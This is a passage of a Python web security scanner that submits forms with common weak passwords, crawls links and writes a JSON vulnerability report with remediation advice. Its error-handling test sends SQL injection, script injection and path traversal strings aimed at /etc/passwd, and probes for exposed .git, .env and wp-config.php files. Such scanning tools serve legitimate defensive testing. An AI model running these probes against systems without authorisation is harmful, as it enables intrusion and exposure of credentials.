            form_action = form.get('action', '')
            if not form_action:
                form_action = self.target
            elif form_action.startswith('/'):
                form_action = urljoin(self.base_url, form_action)
            
            # Test for weak password acceptance
            self._test_weak_password_acceptance(form, form_action)
    
    def _test_weak_password_acceptance(self, form: Any, form_action: str) -> None:
        """Test if the form accepts weak passwords."""
        weak_passwords = [
            "password",
            "123456",
            "qwerty",
            "letmein",
            "welcome"
        ]
        
        inputs = form.find_all('input')
        
        for weak_password in weak_passwords:
            try:
                data = {}
                password_field = None
                username_field = None
                
                for input_field in inputs:
                    input_type = input_field.get('type', '')
                    input_name = input_field.get('name', '')
                    
                    if input_type == 'password':
                        password_field = input_name
                        data[input_name] = weak_password
                    elif 'user' in input_name.lower() or 'email' in input_name.lower() or 'login' in input_name.lower():
                        username_field = input_name
                        data[input_name] = f"test_user_{secrets.token_hex(4)}@example.com"
                    elif input_name and input_type not in ('submit', 'button', 'reset'):
                        data[input_name] = "test"
                
                if password_field and username_field:
                    response = self.session.post(form_action, data=data, allow_redirects=True, timeout=10)
                    
                    # Check if the registration/password change was successful
                    # This is a heuristic and might need adjustment
                    if (response.status_code == 200 or response.status_code == 302) and (
                            'success' in response.text.lower() or 
                            'welcome' in response.text.lower() or 
                            'thank' in response.text.lower() or
                            'account' in response.text.lower()):
                        
                        self.vulnerabilities.append(Vulnerability(
                            name="Weak Password Acceptance",
                            description=f"The application accepts weak passwords like '{weak_password}'",
                            level=VulnerabilityLevel.MEDIUM,
                            location=form_action,
                            details={"weak_password": weak_password},
                            remediation="Implement a strong password policy that requires complexity and minimum length."
                        ))
                        logger.warning(f"Weak password acceptance found at {form_action}")
                        break  # Break after finding the first weak password that works
            
            except Exception as e:
                logger.error(f"Error testing weak password acceptance: {str(e)}")

    def test_error_handling(self) -> None:
        """Test for information disclosure through error messages."""
        logger.info("Testing error handling and information disclosure")
        
        # Generate requests that might cause errors
        test_cases = [
            (self.target + "' OR 1=1", "SQL error"),
            (self.target + "<script>alert(1)</script>", "XSS error"),
            (self.target + "/../../../../etc/passwd", "Path traversal error"),
            (self.target + "/non_existent_page", "404 error"),
            (self.target + "/.git/", "Git repository exposure"),
            (self.target + "/.env", "Environment file exposure"),
            (self.target + "/wp-config.php", "WordPress config exposure")
        ]
        
        for url, error_type in test_cases:
            try:
                response = self.session.get(url, timeout=10)
                
                # Check for verbose errors
                error_indicators = [
                    "exception",
                    "stack trace",
                    "error on line",
                    "syntax error",
                    "failed to open stream",
                    "warning:",
                    "failed to load",
                    "uncaught exception",
                    "fatal error",
                    "debug info"
                ]
                
                verbose_error = None
                for indicator in error_indicators:
                    if indicator in response.text.lower():
                        verbose_error = indicator
                        break
                
                if verbose_error:
                    self.vulnerabilities.append(Vulnerability(
                        name="Verbose Error Messages",
                        description="The application returns detailed error messages that may expose sensitive information",
                        level=VulnerabilityLevel.MEDIUM,
                        location=url,
                        details={"error_type": error_type, "error_indicator": verbose_error},
                        remediation="Configure custom error pages. Disable detailed error reporting in production."
                    ))
                    logger.warning(f"Verbose error messages found at {url}")
                
                # Check for sensitive file exposure
                if "/.git/" in url and response.status_code != 404:
                    self.vulnerabilities.append(Vulnerability(
                        name="Git Repository Exposure",
                        description="Git repository information is publicly accessible",
                        level=VulnerabilityLevel.HIGH,
                        location=url,
                        details={},
                        remediation="Block access to .git directories in your web server configuration."
                    ))
                    logger.critical(f"Git repository exposure found at {url}")
                
                if "/.env" in url and response.status_code != 404:
                    self.vulnerabilities.append(Vulnerability(
                        name="Environment File Exposure",
                        description="Environment configuration file is publicly accessible",
                        level=VulnerabilityLevel.CRITICAL,
                        location=url,
                        details={},
                        remediation="Block access to .env files and other configuration files in your web server configuration."
                    ))
                    logger.critical(f"Environment file exposure found at {url}")
            
            except Exception as e:
                logger.error(f"Error testing error handling: {str(e)}")

    def _get_forms(self) -> List[Any]:
        """Get all forms from the target website."""
        forms = []
        try:
            response = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            # Also check a few common pages
            common_pages = [
                '/login', '/register', '/signup', '/contact', '/forgot-password',
                '/reset-password', '/admin', '/user', '/account', '/profile',
                '/search', '/comments', '/feedback'
            ]
            
            for page in common_pages:
                page_url = urljoin(self.base_url, page)
                try:
                    page_response = self.session.get(page_url, timeout=10)
                    page_soup = BeautifulSoup(page_response.text, 'html.parser')
                    page_forms = page_soup.find_all('form')
                    forms.extend(page_forms)
                except Exception:
                    pass
            
        except Exception as e:
            logger.error(f"Error getting forms: {str(e)}")
        
        return forms

    def _find_login_forms(self) -> List[Any]:
        """Find login forms on the target website."""
        login_forms = []
        
        forms = self._get_forms()
        
        for form in forms:
            inputs = form.find_all('input')
            has_password = False
            has_username = False
            
            for input_field in inputs:
                input_type = input_field.get('type', '')
                input_name = input_field.get('name', '').lower()
                input_id = input_field.get('id', '').lower()
                
                if input_type == 'password':
                    has_password = True
                
                if ('user' in input_name or 'email' in input_name or 'login' in input_name or
                        'user' in input_id or 'email' in input_id or 'login' in input_id):
                    has_username = True
            
            if has_password and has_username:
                login_forms.append(form)
        
        return login_forms

    def _get_all_links(self) -> List[str]:
        """Get all links from the target website."""
        links = set()
        
        try:
            # Get the main page
            response = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all <a> tags
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']
                
                # Skip empty links, javascript links, and anchor links
                if not href or href.startswith('javascript:') or href.startswith('#'):
                    continue
                
                # Convert relative URLs to absolute URLs
                if href.startswith('/'):
                    href = urljoin(self.base_url, href)
                elif not href.startswith('http'):
                    href = urljoin(self.target, href)
                
                # Only include links to the same domain
                if self.hostname in href:
                    links.add(href)
            
            # Also check for links in JavaScript and other sources
            scripts = soup.find_all('script')
            for script in scripts:
                script_content = script.string
                if script_content:
                    # Extract URLs from JavaScript using a simple regex
                    js_urls = re.findall(r'[\'"]([\/][^\'\"]*)[\'"]', script_content)
                    for url in js_urls:
                        if url.startswith('/'):
                            abs_url = urljoin(self.base_url, url)
                            links.add(abs_url)
            
            # Crawl a few links to get more
            links_to_crawl = list(links)[:5]  # Limit to first 5 to avoid excessive crawling
            
            for link in links_to_crawl:
                try:
                    link_response = self.session.get(link, timeout=10)
                    link_soup = BeautifulSoup(link_response.text, 'html.parser')
                    
                    for a_tag in link_soup.find_all('a', href=True):
                        href = a_tag['href']
                        
                        if not href or href.startswith('javascript:') or href.startswith('#'):
                            continue
                        
                        if href.startswith('/'):
                            href = urljoin(self.base_url, href)
                        elif not href.startswith('http'):
                            href = urljoin(link, href)
                        
                        if self.hostname in href:
                            links.add(href)
                except Exception:
                    pass
            
        except Exception as e:
            logger.error(f"Error getting links: {str(e)}")
        
        return list(links)

    def _response_similarity(self, text1: str, text2: str) -> float:
        """Calculate the similarity between two response texts."""
        # A very simple similarity measure - in a real scenario, this would be more sophisticated
        len_text1 = len(text1)
        len_text2 = len(text2)
        
        if len_text1 == 0 or len_text2 == 0:
            return 0.0
        
        # Calculate size similarity
        size_similarity = 1.0 - abs(len_text1 - len_text2) / max(len_text1, len_text2)
        
        return size_similarity

    def generate_report(self) -> None:
        """Generate a security report with found vulnerabilities."""
        logger.info("Generating security report")
        
        # Convert vulnerabilities to JSON-serializable format
        report_data = {
            "target": self.target,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "vulnerabilities": [
                {
                    "name": vuln.name,
                    "description": vuln.description,
                    "level": vuln.level.name,
                    "location": vuln.location,
                    "details": vuln.details,
                    "remediation": vuln.remediation
                }
                for vuln in self.vulnerabilities
            ],
            "summary": {
                "total_vulnerabilities": len(self.vulnerabilities),
                "critical": len([v for v in self.vulnerabilities if v.level == VulnerabilityLevel.CRITICAL]),
                "high": len([v for v in self.vulnerabilities if v.level == VulnerabilityLevel.HIGH]),
                "medium": len([v for v in self.vulnerabilities if v.level == VulnerabilityLevel.MEDIUM]),
                "low": len([v for v in self.vulnerabilities if v.level == VulnerabilityLevel.LOW]),
                "info": len([v for v in self.vulnerabilities if v.level == VulnerabilityLevel.INFO])
            }
        }
        
        # Write the report to a JSON file
        try:
            with open(self.output_file, 'w') as f:
                json.dump(report_data, f, indent=4)
            
            logger.info(f"Security report saved to {self.output_file}")
        except Exception as e:
            logger.error(f"Error saving security report: {str(e)}")


def main():
    """Main function to run the security tester."""
    parser = argparse.ArgumentParser(description='Comprehensive Security Testing Framework')
    
    parser.add_argument('target', help='URL or IP address of the target system')
    parser.add_argument('-o', '--output', default='security_report.json',
                       help='Output file for the security report (default: security_report.json)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Start the security tester
    tester = SecurityTester(args.target, args.output)
    tester.run_all_tests()
    
    # Print a summary
    print("\nSecurity Testing Summary:")
    print(f"Target: {args.target}")
    print(f"Total vulnerabilities found: {len(tester.vulnerabilities)}")
    
    level_counts = {level: 0 for level in VulnerabilityLevel}
    for vuln in tester.vulnerabilities:
        level_counts[vuln.level] += 1
    
    print(f"Critical: {level_counts[VulnerabilityLevel.CRITICAL]}")
    print(f"High: {level_counts[VulnerabilityLevel.HIGH]}")
    print(f"Medium: {level_counts[VulnerabilityLevel.MEDIUM]}")
    print(f"Low: {level_counts[VulnerabilityLevel.LOW]}")
    print(f"Info: {level_counts[VulnerabilityLevel.INFO]}")
    print(f"\nDetailed report saved to: {args.output}")


if __name__ == "__main__":
    main()